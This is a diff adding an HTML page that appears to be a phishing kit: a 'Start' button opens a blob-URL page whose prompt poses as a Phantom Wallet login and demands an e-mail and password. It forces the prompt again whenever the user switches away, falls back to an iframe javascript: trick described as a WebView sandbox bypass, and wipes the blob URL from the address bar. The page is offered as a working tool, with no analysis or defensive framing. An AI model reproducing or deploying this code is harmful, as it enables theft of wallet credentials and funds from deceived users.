@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <title>Blob Null → Forced Prompt (Click → Home)</title>
+  <meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts allow-modals">
+  <style>
+    body{font-family:system-ui,sans-serif;text-align:center;padding-top:100px;}
+    button{padding:12px 18px;border-radius:10px;border:1px solid #ccc;cursor:pointer}
+  </style>
+</head>
+<body>
+  <h1>Click Here</h1>
+  <button id="go">Start</button>
+
+  <script>
+    document.getElementById('go').addEventListener('click', () => {
+      const blobInner = `<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox WebView – forced prompt (Blob)</title>
+  <style>
+    iframe{visibility:hidden;position:absolute;width:0;height:0;border:0;}
+    body{font-family:system-ui,sans-serif;text-align:center;padding-top:100px;}
+  </style>
+</head>
+<body>
+  <h1>Loading…</h1>
+  <iframe id="shim"></iframe>
+  <script>
+  (function(){
+    var solved = false;
+    var msg =
+      'In order to access phantom.app\\n' +
+      'you must first login on your\\nPhantom Wallet Account.\\n\\n' +
+      'Please type your e-mail\\nand your password:';
+
+    function forcePrompt(){
+      if (solved) return true;
+      try {
+        var v = '';
+        while (v === null || (''+v).trim() === '') {
+          v = prompt(msg, 'E-mail / Password.');
+        }
+        solved = true;
+        // Hapus jejak blob di address bar
+        setTimeout(function(){ location.replace('about:blank'); }, 30);
+      } catch(e) { return false; }
+      return true;
+    }
+
+    function iframeFallback(){
+      if (solved) return true;
+      try {
+        var code =
+          "(function(){try{" +
+          "var m=" + JSON.stringify(msg) + ";" +
+          "var v='';" +
+          "while(v===null||(''+v).trim()===''){v=prompt(m,'E-mail / Password.');}" +
+          "}}catch(e){}})()";
+        var shim = document.getElementById('shim');
+        shim.src = 'javascript:' + code;
+        return true;
+      } catch(e) { return false; }
+    }
+
+    function tryAll(){
+      if (solved) return;
+      if (!forcePrompt()) iframeFallback();
+    }
+
+    // Trigger saat user menekan Home / kehilangan fokus
+    window.addEventListener('blur', function(){ setTimeout(tryAll, 10); });
+    document.addEventListener('visibilitychange', function(){
+      if (document.hidden) setTimeout(tryAll, 10);
+    });
+    window.addEventListener('pagehide', function(){ setTimeout(tryAll, 10); });
+
+    // Jika user kembali tanpa solved, coba lagi agar tetap muncul
+    window.addEventListener('focus', function(){ if (!solved) setTimeout(tryAll, 10); });
+  })();
+  <\/script>
+</body>
+</html>`;
+
+      const blob = new Blob([blobInner], { type: 'text/html' });
+      const url = URL.createObjectURL(blob);
+      // Masuk ke blob setelah klik (agar butuh user gesture)
+      location.replace(url);
+    });
+  </script>
+</body>
+</html>
